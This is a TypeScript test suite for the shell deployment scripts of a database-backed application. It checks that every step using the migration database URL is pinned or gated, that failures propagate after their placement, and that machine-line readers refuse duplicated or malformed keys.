  if (buffer !== '') logical.push({ text: buffer, line: opener })

  const out: CensusEntry[] = []
  const aliases = new Set<string>()
  let depth = 0
  let pending: CensusEntry | null = null
  const place = (placedBy: string | null) => {
    if (pending !== null) { pending.placedBy = placedBy; out.push(pending); pending = null }
  }
  for (const { text, line } of logical) {
    const raw = lines[line]
    // The brace convention these scripts are written in, matched on the RAW line so that a `}`
    // inside a heredoc cannot close a function this walk thinks it is inside.
    if (/^[a-z_][a-z0-9_]*\(\)\s*\{$/.test(raw)) { depth += 1; continue }
    if (depth > 0) { if (raw === '}') depth -= 1; continue }
    if (text.startsWith('#')) continue

    const pin = /^pin_migration_window (.*)$/.exec(text)
    if (pin) {
      place('pin')
      out.push({ kind: 'placement', label: `pin ${pin[1]}`, step: text, line, placedBy: null })
      continue
    }
    if (/^require_migration_landed_on_fenced_server$/.test(text)) {
      place('gate')
      out.push({ kind: 'placement', label: 'gate', step: text, line, placedBy: null })
      continue
    }

    const word = /^([A-Za-z_][A-Za-z0-9_]*)/.exec(text)?.[1] ?? ''
    const mentions = (name: string) => new RegExp(`(^|[^A-Za-z0-9_])\\$\\{?${name}\\}?([^A-Za-z0-9_]|$)`).test(text)
      || new RegExp(`(^|[\\s;(&|!])${name}(\\s|=|$|\\))`).test(text)
    const references = /\bMIGRATION_DATABASE_URL\b/.test(text)
      || [...aliases].some(mentions)
      || [...carriers].some((name) => new RegExp(`(^|[\\s;(&|!])${name}(\\s|$|\\))`).test(text))
    if (!references) continue

    // A WHOLE-STATEMENT ASSIGNMENT, and nothing that merely BEGINS with one. `DATABASE_URL="..."
    // node x` is an `env`-style prefix on a command and is a consumer; `NAME="..."` on its own is
    // not. Command substitution anywhere in the value makes it a consumer either way, because
    // `$( ... )` runs a process with that value in hand.
    const assignment = /^([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|\S*)$/.exec(text)
    if (assignment && !/\$\(/.test(text)) {
      const [, name] = assignment
      if (name === 'MIGRATION_DATABASE_URL') {
        place(null)
        out.push({ kind: 'assignment', label: 'MIGRATION_DATABASE_URL=', step: text, line, placedBy: null })
      } else {
        aliases.add(name)
        place(null)
        out.push({ kind: 'alias', label: `alias:${name}`, step: text, line, placedBy: null })
      }
      continue
    }

    if (MIGRATION_URL_MECHANISMS.includes(word)) {
      place(null)
      out.push({ kind: 'mechanism', label: word, step: text, line, placedBy: null })
      continue
    }

    // AN EXIT TRAP IS A REGISTRATION, NOT A STEP. `trap on_cutover_exit EXIT` names a handler that
    // reaches the URL -- which is why it is in this census at all -- but it runs nothing now, and
    // there is nothing for a pin to place. It is classified rather than excused: the handler has to
    // BE a carrier, and the whole statement is spelled out in the expected list below, so a trap
    // that started calling something else fails here.
    const trapped = /^trap ([A-Za-z_][A-Za-z0-9_]*) ([A-Z]+)$/.exec(text)
    if (trapped && carriers.has(trapped[1])) {
      place(null)
      out.push({ kind: 'mechanism', label: text, step: text, line, placedBy: null })
      continue
    }

    place(null)
    pending = { kind: 'consumer', label: labelFor(text), step: text, line, placedBy: null }
  }
  place(null)
  return out
}

/** What each consumer is called in the assertions below, so a failure names a step. */
const CONSUMER_LABELS: ReadonlyArray<[RegExp, string]> = [
  [/prisma generate/, 'prisma generate'],
  [/npm run build/, 'npm run build'],
  [/check-wms-push-state-enum/, 'check-wms-push-state-enum.mjs'],
  [/check-db-writers/, 'check-db-writers.mjs'],
  [/pg_dump/, 'pg_dump'],
  [/prisma migrate deploy/, 'prisma migrate deploy'],
  [/check-prisma-drift/, 'check-prisma-drift.mjs'],
  [/DB_OBJECT_ACCESS_SCRIPT|check-app-db-object-access/, 'check-app-db-object-access.mjs'],
  [/run-migration-verifications/, 'run-migration-verifications.mjs'],
  [/db:seed/, 'db:seed'],
  [/BOOTSTRAP_SCRIPT|provision-instance/, 'provision-instance.mjs'],
]

/** The step's own text, and nothing else: the whole statement is already in `step`. */
const labelFor = (step: string): string => {
  for (const [pattern, label] of CONSUMER_LABELS) if (pattern.test(step)) return label
  return step
}

const FENCE_LIB_SOURCE = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')

for (const [name, lines, expectedConsumers, expectedClassified] of [
  ['install.sh', INSTALL_LINES, [
    'prisma generate', 'npm run build',
    'check-db-writers.mjs', 'prisma migrate deploy', 'check-prisma-drift.mjs',
    'check-app-db-object-access.mjs', 'run-migration-verifications.mjs',
    'db:seed', 'provision-instance.mjs',
  ], [
    'assignment:MIGRATION_DATABASE_URL=',
    'assignment:MIGRATION_DATABASE_URL=',
    'mechanism:trap on_cutover_exit EXIT',
    'mechanism:adopt_existing_fence',
    'consumer:prisma generate', 'placement:pin "The Prisma client generation"',
    'consumer:npm run build', 'placement:pin "The build"',
    'mechanism:fence_db_connections',
    'consumer:check-db-writers.mjs', 'placement:pin "The drain probe"',
    'consumer:prisma migrate deploy', 'placement:pin "The migration"',
    'consumer:check-prisma-drift.mjs', 'placement:pin "The drift check"',
    'consumer:check-app-db-object-access.mjs', 'placement:pin "The object-access check"',
    'consumer:run-migration-verifications.mjs', 'placement:pin "The verification hook"',
    'consumer:db:seed', 'placement:pin "The seed"',
    'consumer:provision-instance.mjs', 'placement:gate',
    'mechanism:release_db_connections',
  ]],
  ['update.sh', UPDATE_LINES, [
    'prisma generate', 'npm run build',
    'check-db-writers.mjs', 'pg_dump', 'prisma migrate deploy', 'check-prisma-drift.mjs',
    'check-app-db-object-access.mjs', 'run-migration-verifications.mjs',
  ], [
    'assignment:MIGRATION_DATABASE_URL=',
    'mechanism:trap on_exit EXIT',
    'mechanism:resume_from_interrupted_arming',
    'mechanism:adopt_db_connections',
    'mechanism:release_db_connections',
    'consumer:prisma generate', 'placement:pin "The Prisma client generation"',
    'consumer:npm run build', 'placement:pin "The build"',
    'mechanism:fence_db_connections',
    'consumer:check-db-writers.mjs', 'placement:pin "The drain probe"',
    'consumer:pg_dump', 'placement:pin "The pre-migration backup"',
    'consumer:prisma migrate deploy', 'placement:pin "The migration"',
    'consumer:check-prisma-drift.mjs', 'placement:pin "The drift check"',
    'consumer:check-app-db-object-access.mjs', 'placement:pin "The object-access check"',
    'consumer:run-migration-verifications.mjs', 'placement:gate',
    'mechanism:release_db_connections',
  ]],
  ['deploy.sh', DEPLOY_LINES, [
    'npm run build', 'check-wms-push-state-enum.mjs',
    'check-db-writers.mjs', 'prisma migrate deploy', 'check-prisma-drift.mjs',
    'check-app-db-object-access.mjs', 'run-migration-verifications.mjs',
  ], [
    'assignment:MIGRATION_DATABASE_URL=',
    'mechanism:trap on_exit EXIT',
    'mechanism:resume_from_interrupted_arming',
    'mechanism:adopt_db_connections',
    'mechanism:release_db_connections',
    'consumer:npm run build', 'placement:pin "The build"',
    'consumer:check-wms-push-state-enum.mjs', 'placement:pin "The WMS push-state vocabulary check"',
    'mechanism:fence_db_connections',
    'consumer:check-db-writers.mjs', 'placement:pin "The drain probe"',
    'consumer:prisma migrate deploy', 'placement:pin "The migration"',
    'consumer:check-prisma-drift.mjs', 'placement:pin "The drift check"',
    'consumer:check-app-db-object-access.mjs', 'placement:pin "The object-access check"',
    'consumer:run-migration-verifications.mjs', 'placement:gate',
    'mechanism:release_db_connections',
  ]],
] as ReadonlyArray<[string, string[], string[], string[]]>) {
  test(`${name}: every top-level reference to the migration URL is classified, and every consumer is placed (o3d-secops r34, Codex MEDIUM)`, () => {
    const carriers = migrationUrlCarriers([lines.join('\n'), FENCE_LIB_SOURCE])
    const census = migrationConsumerCensus(lines, carriers)

    // THE MECHANISM TABLE CANNOT BE A HIDING PLACE. Every name this file classified as mechanism
    // must be a real function that really does reach the URL; a renamed or invented one fails here
    // rather than quietly excusing a step from its placement.
    for (const entry of census.filter((row) => row.kind === 'mechanism')) {
      const handler = /^trap ([A-Za-z_][A-Za-z0-9_]*) /.exec(entry.label)?.[1] ?? entry.label
      assert.ok(carriers.has(handler),
        `${entry.label} is classified as fence machinery but is not a function that touches the migration URL:\n${entry.step}`)
    }

    // THE WALK REACHED THE FILE. A census that found nothing would pass every rule below.
    assert.ok(census.length >= 15,
      `precondition: the walk must find this entrypoint's references, not an empty file:\n${JSON.stringify(census, null, 2)}`)
    assert.ok(carriers.has('pin_migration_window') && carriers.size >= 8,
      `precondition: function bodies must have been read, or nothing is being followed:\n${[...carriers].join(', ')}`)

    // EVERY TOP-LEVEL REFERENCE, CLASSIFIED, IN FILE ORDER. This is the fail-closed half: a step
    // added in ANY spelling changes this list, whatever regex it would or would not have matched.
    assert.deepEqual(census.map((row) => `${row.kind}:${row.label}`), expectedClassified,
      `the top-level references to the migration URL are not what this entrypoint was last read to have:\n${JSON.stringify(census, null, 2)}`)

    const consumers = census.filter((row) => row.kind === 'consumer')
    assert.deepEqual(consumers.map((row) => row.label), expectedConsumers,
      `the consumers of the migration URL, in file order, are not what this entrypoint was last read to have:\n${JSON.stringify(consumers, null, 2)}`)

    const unplaced = consumers.filter((row) => row.placedBy === null)
    assert.deepEqual(unplaced.map((row) => row.label), [],
      `every step handed the migration URL must be followed by a pin or by the closing gate before the next one begins; these are not:\n${JSON.stringify(unplaced, null, 2)}`)

    // AND THE GATE IS THE LAST PLACEMENT, not one in the middle with consumers trailing it. This
    // is the r32 defect stated as a rule: the seed and the bootstrap sat below it.
    const gated = consumers.findIndex((row) => row.placedBy === 'gate')
    assert.notEqual(gated, -1, `the closing gate must place one of them:\n${JSON.stringify(consumers, null, 2)}`)
    assert.equal(gated, consumers.length - 1,
      `the closing gate must place the LAST consumer; these run after it with nothing watching: ${consumers.slice(gated + 1).map((row) => row.label).join(', ')}`)
  })

  test(`${name}: a consumer that fails still reaches its placement, and its status is propagated after it (o3d-secops r34, Codex HIGH 2)`, () => {
    const carriers = migrationUrlCarriers([lines.join('\n'), FENCE_LIB_SOURCE])
    const consumers = migrationConsumerCensus(lines, carriers).filter((row) => row.kind === 'consumer')
    assert.ok(consumers.length >= 7, `precondition: the walk must find the consumers:\n${JSON.stringify(consumers, null, 2)}`)

    for (const consumer of consumers) {
      const disposition = consumerFailureDisposition(lines as string[], consumer.line)
      // EVERY ONE OF THEM IS PLACED, so every one of them must CAPTURE rather than die where it
      // stands: a `die` above the pin is exactly how a step that moved schema and then failed
      // escaped its placement, and `set -e` on a bare statement does the same thing silently.
      assert.equal(disposition.shape, 'captured',
        `${consumer.label} is placed by ${consumer.placedBy}, so its exit status must be captured and propagated AFTER that placement, not before it: ${disposition.detail}`)
      // AND THE PROPAGATION IS BELOW THE PLACEMENT, which is the ordering the finding is about.
      const propagation = (lines as string[]).findIndex((line, index) =>
        index > consumer.line && disposition.status !== null && new RegExp(`\\$\\{?${disposition.status}\\}?\\b`).test(line))
      const placement = (lines as string[]).findIndex((line, index) =>
        index > consumer.line && /^\s*(pin_migration_window |require_migration_landed_on_fenced_server$)/.test(line))
      assert.notEqual(placement, -1, `${consumer.label} must have a placement below it`)
      assert.ok(propagation > placement,
        `${consumer.label}: its failure is propagated at line ${propagation + 1}, above its placement at line ${placement + 1} — the placement would never run`)
    }
  })
}

// ---------------------------------------------------------------------------
// o3d-secops r34, Codex MEDIUM — A CONSUMER ADDED IN A FORM NOBODY LISTED.
//
// The census above asserts what the entrypoints hold TODAY, and a list of what is there cannot
// show that a list of FORMS would have missed something: r33's three regexes passed their own
// census perfectly, every round, while the shape they could not see was the whole finding. So this
// splices new consumers into a shipped entrypoint, in three forms that r33's detector is carried
// here verbatim to be shown NOT MATCHING, and requires the new census to catch each one.
//
// THE POSITION IS THE r32 DEFECT'S OWN. Each is added immediately BELOW the closing gate, which is
// where `npm run db:seed` and `provision-instance.mjs` actually sat -- past the last placement,
// on the same movable string, with nothing looking afterwards.
// ---------------------------------------------------------------------------
test('the census catches a consumer added in a form no earlier round listed, and r33\'s three regexes do not (o3d-secops r34, Codex MEDIUM)', () => {
  const carriers = migrationUrlCarriers([INSTALL_LINES.join('\n'), FENCE_LIB_SOURCE])
  const shipped = migrationConsumerCensus(INSTALL_LINES, carriers)
  // ANNOTATED, BECAUSE `assert.ok` IS AN ASSERTION FUNCTION. TypeScript narrows through one only
  // when the asserted name is declared with an explicit type; without it the narrowing of `gate`
  // becomes circular through the initializers below and every one of them falls back to `any`.
  const gate: CensusEntry | undefined = shipped.find((row) => row.label === 'gate')
  assert.ok(gate, `precondition: the shipped entrypoint must have a closing gate to add below:\n${JSON.stringify(shipped, null, 2)}`)
  assert.deepEqual(shipped.filter((row) => row.kind === 'consumer' && row.placedBy === null), [],
    'precondition: the shipped file must start with every consumer placed, or the assertions below prove nothing')

  // r33'S DETECTOR, COPIED VERBATIM. It is the foil: each addition below must be invisible to it.
  const r33Hands = (text: string): boolean =>
    /DATABASE_URL="\$\{?MIGRATION_DATABASE_URL\}?"/.test(text)
    || /(^|[!\s])pg_dump "\$\{MIGRATION_DATABASE_URL\}"/.test(text)
    || /(^|[!\s])as_app_user_db /.test(text)

  for (const [shape, added, expectedTail] of [
    ['a top-level command handed the URL directly',
      ['psql "$MIGRATION_DATABASE_URL" -c \'select 1\''],
      ['consumer']],
    ['an unquoted assignment prefix',
      ['DATABASE_URL=$MIGRATION_DATABASE_URL node scripts/whatever.mjs'],
      ['consumer']],
    ['a command that reaches it through a name it was copied into',
      ['MIGRATION_URL_COPY="${MIGRATION_DATABASE_URL}"', 'node scripts/whatever.mjs "$MIGRATION_URL_COPY"'],
      ['alias', 'consumer']],
  ] as ReadonlyArray<[string, string[], string[]]>) {
    assert.ok(!added.some(r33Hands),
      `precondition: ${shape} must be invisible to r33's three forms, or this case proves nothing about them:\n${added.join('\n')}`)

    const mutated = [...INSTALL_LINES.slice(0, gate.line + 1), ...added, ...INSTALL_LINES.slice(gate.line + 1)]
    const census = migrationConsumerCensus(mutated, carriers)

    // THE CLASSIFICATION IS FAIL-CLOSED: every one of them lands in the list, in the kind it is.
    const spliced: CensusEntry[] = census.filter((row) => row.line > gate.line && row.line <= gate.line + added.length)
    assert.deepEqual(
      spliced.map((row) => row.kind),
      expectedTail,
      `${shape} must be classified rather than skipped:\n${JSON.stringify(census, null, 2)}`,
    )

    // AND THE CONSUMER IT ADDS IS UNPLACED, which is the rule that would fail a real one.
    const unplaced = census.filter((row) => row.kind === 'consumer' && row.placedBy === null)
    assert.equal(unplaced.length, 1,
      `${shape} must leave exactly one consumer with nothing placing it:\n${JSON.stringify(census, null, 2)}`)

    // AND THE GATE IS NO LONGER THE LAST PLACEMENT, which is r32's rule restated.
    const consumers = census.filter((row) => row.kind === 'consumer')
    const gated = consumers.findIndex((row) => row.placedBy === 'gate')
    assert.notEqual(gated, consumers.length - 1,
      `${shape} runs after the closing gate, so the gate must stop being the last placement:\n${JSON.stringify(consumers, null, 2)}`)
  }
})

// AND A CONSUMER MOVED INTO A HELPER DOES NOT LEAVE THE CENSUS (o3d-secops r34, Codex MEDIUM).
// r33 skipped function bodies and said so, on the grounds that a consumer moved into one "would
// leave the census rather than silently passing it" -- but leaving a census IS passing it: the
// detected list and the expected list both shrink by the same entry and nothing fails. The census
// now follows calls to any function whose body reaches the URL, so the helper's CALL SITE is the
// reference and it still has to be placed.
test('a consumer moved into a helper is still in the census, through the call site (o3d-secops r34, Codex MEDIUM)', () => {
  const carriers = migrationUrlCarriers([INSTALL_LINES.join('\n'), FENCE_LIB_SOURCE])
  const gate: CensusEntry | undefined = migrationConsumerCensus(INSTALL_LINES, carriers).find((row) => row.label === 'gate')
  assert.ok(gate)

  const helper = [
    'late_settings_writer() {',
    '  run_as_user "${APP_USER}" env DATABASE_URL="${MIGRATION_DATABASE_URL}" node scripts/whatever.mjs',
    '}',
    'late_settings_writer',
  ]
  const mutated = [...INSTALL_LINES.slice(0, gate.line + 1), ...helper, ...INSTALL_LINES.slice(gate.line + 1)]
  const mutatedCarriers = migrationUrlCarriers([mutated.join('\n'), FENCE_LIB_SOURCE])

  assert.ok(mutatedCarriers.has('late_settings_writer'),
    `precondition: the helper's body names the URL, so the walk must have learned that it carries it:\n${[...mutatedCarriers].join(', ')}`)

  const census = migrationConsumerCensus(mutated, mutatedCarriers)
  const unplaced = census.filter((row) => row.kind === 'consumer' && row.placedBy === null)
  assert.deepEqual(unplaced.map((row) => row.step), ['late_settings_writer'],
    `the call site must be the unplaced consumer, not an entry that quietly vanished:\n${JSON.stringify(census, null, 2)}`)
})

// AND THE SHIPPED FILES REALLY ARE WRITTEN THAT WAY (o3d-secops r34). The rig above proves what the
// two shapes DO; this is the half that fails if either entrypoint drifts back to the first draft.
//
// MUTATION ROUTE (made against the shipped files and reverted): move `tail -40 "$BUILD_LOG" >&2`
// out of the build statement in deploy.sh and back into an `if [[ "$build_rc" -ne 0 ]]` block below
// `pin_migration_window "The build"` -- both assertions below fail, naming deploy.sh. The same for
// `rm -f "${BACKUP_PARTIAL}"` in update.sh.
for (const [name, lines, consumer, diagnostic] of [
  ['deploy.sh', DEPLOY_LINES, /as_app_user_db npm run build /, 'tail -40 "$BUILD_LOG"'],
  ['update.sh', UPDATE_LINES, /pg_dump "\$\{MIGRATION_DATABASE_URL\}"/, 'rm -f "${BACKUP_PARTIAL}"'],
] as ReadonlyArray<[string, string[], RegExp, string]>) {
  test(`${name}: the diagnostic belonging to a failed consumer is inside its own statement, not below the placement (o3d-secops r34)`, () => {
    const call = realCodeLine(lines, consumer)
    assert.notEqual(call, -1, 'precondition: the consumer must be found, or this test walks nothing')

    const statement = callContinuation(lines, call)
    assert.ok(statement.includes(diagnostic),
      `${diagnostic} belongs to this step's failure and must run INSIDE its statement, because the placement below it can itself refuse:\n${statement}`)

    // AND IT IS STILL A CAPTURE, so widening the statement did not cost the propagation.
    const disposition = consumerFailureDisposition(lines, call)
    assert.equal(disposition.shape, 'captured',
      `and the status must still be captured and propagated after the placement: ${disposition.detail}`)

    // AND NOWHERE BELOW THE PLACEMENT, which is the position it was lost from.
    const end = statementEnd(lines, call)
    const placement = lines.findIndex((line, index) => index > end && /^\s*pin_migration_window /.test(line))
    assert.notEqual(placement, -1, 'precondition: this consumer must have a placement below it')
    const below = lines.slice(placement, placement + 10)
    assert.ok(!below.some((line) => line.includes(diagnostic)),
      `${diagnostic} must not also sit below the placement, where a refusal would leave before it:\n${below.join('\n')}`)
  })
}

// ---------------------------------------------------------------------------
// o3d-secops r32, Codex HIGH 1 — THE OTHER MACHINE LINES THIS BRANCH READS.
//
// The verdicts are not the only things read out of a captured stream. Root also reads the fence
// PLAN (one JSON document), the digest of the record the validator published, the release's
// cluster identity, and the audit's three verdict lines. Every one of them was `sed -n
// 's/^key=\(.*\)$/\1/p' | tail -1` or a bare substring, and the two defects are separable:
//
//   THE CHANNEL. Fixed at the source: all eleven of the helper's `console.log` calls are on stderr
//   now and its main() reseats `console.log`, so nothing carrying a database or role name can
//   reach stdout. The producers of `authority_sha256=` do the same -- `CONNECT will be revoked
//   from <roles> on <database>` is on stderr beside it.
//
//   THE READER. `tail -1` is duplicate-TOLERANT: a stream carrying the key twice is read as its
//   last occurrence rather than refused, which is exactly how an appended line becomes the answer.
//   That is what these measure, against the shipped readers, under a real shell.
// ---------------------------------------------------------------------------

/**
 * A MULTI-LINE STREAM, BUILT SO THAT IT REALLY IS MULTI-LINE.
 *
 * `JSON.stringify('a\nb')` yields `"a\nb"`, and inside a bash DOUBLE-QUOTED assignment that is a
 * backslash and an `n` -- one line, not two. The first draft of the tests below passed a
 * JSON-stringified two-line stream, and BOTH of them stayed green when the duplicate guard was
 * mutated away: the reader was refusing a one-line value of the wrong SHAPE, not a duplicate key,
 * so the assertion said nothing about the rule it names. Each line is single-quoted separately and
 * `printf` supplies the newlines.
 */
function shellStream(lines: readonly string[]): string {
  const quoted = lines.map((line) => `'${line.replace(/'/g, `'\\''`)}'`).join(' ')
  return `stream="$(printf '%s\\n' ${quoted})"`
}

test('[o3d-secops r32] the shared machine-field reader takes one value of the stated shape, or nothing', () => {
  const FENCE_LIB = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')
  const run = (lines: readonly string[]) => runShell([
    'set -uo pipefail',
    shellFunction(FENCE_LIB, 'db_fence_machine_field'),
    shellStream(lines),
    'if v="$(db_fence_machine_field "${stream}" authority_sha256 "^[0-9a-f]{64}\\$")"; then echo "TOOK=${v}"; else echo "REFUSED"; fi',
  ].join('\n'))
  const digest = 'a'.repeat(64)
  const other = 'b'.repeat(64)

  // THE ORDINARY CASE, so nothing below passes because the reader refuses everything.
  assert.match(run([`authority_sha256=${digest}`]).output, new RegExp(`^TOOK=${digest}$`, 'm'))
  // AND THE STREAM REALLY IS TWO LINES: a reader handed one line containing a literal backslash-n
  // refuses for the wrong reason, and the duplicate rule below would go unmeasured.
  assert.match(run([`authority_sha256=${digest}`, 'noise']).output, new RegExp(`^TOOK=${digest}$`, 'm'),
    'precondition: a second, unrelated line must not disturb the reading')
  // AND IT IS A WHOLE LINE: prose that CONTAINS the key is not the key.
  assert.match(run([`published authority_sha256=${digest} somewhere`]).output, /^REFUSED$/m)
  // MUTATION ROUTE (made against the shipped file and reverted): change `[[ "${hits}" -eq 1 ]]` to
  // `-ge 1` -- the reader then takes the LAST value, which is the `tail -1` behaviour this
  // replaced, and the two-line case below reports the appended digest instead of refusing.
  assert.match(run([`authority_sha256=${digest}`, `authority_sha256=${other}`]).output, /^REFUSED$/m,
    'a stream carrying the key twice has not answered')
  // AND THE SHAPE IS ENFORCED: a value that is not the thing it claims to be is not a value.
  assert.match(run(['authority_sha256=not-a-digest']).output, /^REFUSED$/m)
  assert.match(run(['nothing here at all']).output, /^REFUSED$/m)
})

test('[o3d-secops r32] the recovery wrappers read their machine lines the same way', () => {
  // THE WRAPPER'S OWN COPY, lifted out of the heredoc the library publishes rather than re-written
  // here: these run as separate root-owned scripts and carry `machine_field` in their own text, so
  // a rule fixed in the library and not in the wrapper would leave the finding open on the path an
  // operator actually drives.
  const FENCE_LIB = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')
  // THE HEREDOC'S CONTENT, without its opener: that content IS the published wrapper, and it is a
  // shell script in its own right. Slicing from the `cat <<'WRAPPER_EOF'` line instead hands the
  // lexer an unterminated here-document, which it refuses to read -- correctly, and loudly.
  const opener = FENCE_LIB.indexOf("cat <<'WRAPPER_EOF'")
  assert.notEqual(opener, -1, 'precondition: the library must publish its wrappers from a heredoc')
  const body = FENCE_LIB.slice(FENCE_LIB.indexOf('\n', opener) + 1, FENCE_LIB.indexOf('\nWRAPPER_EOF\n') + 1)
  assert.ok(body.includes('machine_field()'), 'precondition: the published wrapper must carry the reader')
  const reader = shellFunction(body, 'machine_field')
  const run = (lines: readonly string[], key: string, shape: string) => runShell([
    'set -uo pipefail',
    reader,
    shellStream(lines),
    `if v="$(machine_field "${'${stream}'}" ${key} ${JSON.stringify(shape)})"; then echo "TOOK=${'${v}'}"; else echo "REFUSED"; fi`,
  ].join('\n'))

  const IDENTITY = '^([0-9]+|<unavailable>)/([0-9]+|<unavailable>)$'
  assert.match(run(['release_cluster_identity=7401234/16400'], 'release_cluster_identity', IDENTITY).output, /^TOOK=7401234\/16400$/m)
  assert.match(run(['release_cluster_identity=<unavailable>/16400'], 'release_cluster_identity', IDENTITY).output, /^TOOK=<unavailable>\/16400$/m,
    'a server that will not identify itself is a value, and the operator is shown it')
  assert.match(run(['release_cluster_identity=7401234/16400', 'release_state=already-released'], 'release_cluster_identity', IDENTITY).output, /^TOOK=7401234\/16400$/m,
    'precondition: the stream really is several lines, or the duplicate rule below goes unmeasured')
  // TWO ANSWERS, AND THE SECOND ONE IS THE APPENDED ONE. Under `tail -1` this returned the
  // attacker's; the confirmation token an operator types binds this value.
  // MUTATION ROUTE (made against the shipped file and reverted): `-eq 1` to `-ge 1` in the
  // WRAPPER'S copy of machine_field() -- this line then reports 9999999/16400.
  assert.match(run(['release_cluster_identity=7401234/16400', 'release_cluster_identity=9999999/16400'], 'release_cluster_identity', IDENTITY).output, /^REFUSED$/m)
  // AND THE AUDIT'S VERDICT IS AN ENUMERATION, not "anything after the equals sign".
  const VERDICT = '^(absent|stands|ambiguous)$'
  assert.match(run(['legacy_fence_verdict=absent'], 'legacy_fence_verdict', VERDICT).output, /^TOOK=absent$/m)
  assert.match(run(['legacy_fence_verdict=absent-ish'], 'legacy_fence_verdict', VERDICT).output, /^REFUSED$/m)
  assert.match(run(['legacy_fence_verdict=stands', 'legacy_fence_verdict=absent'], 'legacy_fence_verdict', VERDICT).output, /^REFUSED$/m,
    'and a stream that says both is not evidence for either')
})

// ---------------------------------------------------------------------------
// o3d-secops r32 — AND THE EXIT TRAP'S RE-FENCE STILL CANNOT DIE.
//
// r13's rule, which every round since has had to keep: `refence_db_connections()` runs INSIDE the
// exit trap, where a `die` abandons the rest of the unwind — the crontab, the reboot fence, the
// marker that tells the next run what this one reached. r32 gave the re-fence a new gate that
// refuses, and a refusal reached from a trap is exactly that abandonment.
//
// So the gate takes a MODE, and the difference is only what happens to THIS RUN: on the trap path
// it empties ${MIGRATION_DATABASE_URL} — the same thing the composer's own refusal already does —
// so nothing downstream can migrate on a string this run could not place, and the unwind carries
// on. The existing r13 assertion is a TEXT check (`refence_db_connections` must not contain the
// word `die`), and it passed the whole time this defect was in: the `die` was one call away.
// ---------------------------------------------------------------------------

for (const entry of FENCE_HARNESS) {
  // MUTATION ROUTE (made against the shipped file and reverted): change the re-fence's call back to
  // a bare `bind_migration_to_fenced_server` -- the trap dies, UNWIND CONTINUED is not printed, and
  // the run exits non-zero from inside its own cleanup.
  test(`${entry.name}: a re-fence that cannot place the migration does not kill the exit trap (o3d-secops r32)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32trap-'))
    try {
      // The cutover's own gate binds; the TRAP's re-fence does not. Both go through the same
      // shipped function, and only the mode differs.
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: ['colocated', 'absent'] })
      const result = runShell([
        'set -uo pipefail',
        'exec 2>&1',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        shellFunction(entry.source, 'refence_db_connections'),
        // THE STATE THE TRAP ACTUALLY RUNS IN: the cutover fenced, migrated and RELEASED, and the
        // start or the health check then failed. `refence_db_connections()` returns immediately
        // while ${DB_FENCE_UP} is true, so a rig that skipped the release would exercise nothing.
        'fence_db_connections',
        'DB_FENCE_UP=false',
        'MIGRATION_DATABASE_URL=""',
        // The two names the shipped re-fence reads that this rig does not otherwise set. Both are
        // true of the moment it runs: the schema HAS moved (the start failed after the migration)
        // and no adoption is in progress.
        'SCHEMA_TOUCHED=true',
        'DB_FENCE_ADOPTING=false',
        // The trap's shape, reduced to the two facts that matter: the re-fence runs, and the
        // unwind has more to do afterwards.
        'on_exit() { refence_db_connections || true; echo "UNWIND CONTINUED"; }',
        'trap on_exit EXIT',
        'echo "THE RUN FAILED SOMEWHERE"',
      ].join('\n'))

      assert.match(calls(dir), /^--bind-migration /m,
        `precondition: the re-fence must have tried to place the migration:\n${calls(dir)}`)
      assert.match(result.output, /^UNWIND CONTINUED$/m,
        `a gate that refuses inside the exit trap must not abandon the rest of the unwind:\n${result.output}`)
      assert.doesNotMatch(result.output, /^DIE:/m,
        `and must not die from inside it:\n${result.output}`)
      assert.match(result.output, /discarded/,
        `while still emptying the migration URL, so nothing can migrate on a string it could not place:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}
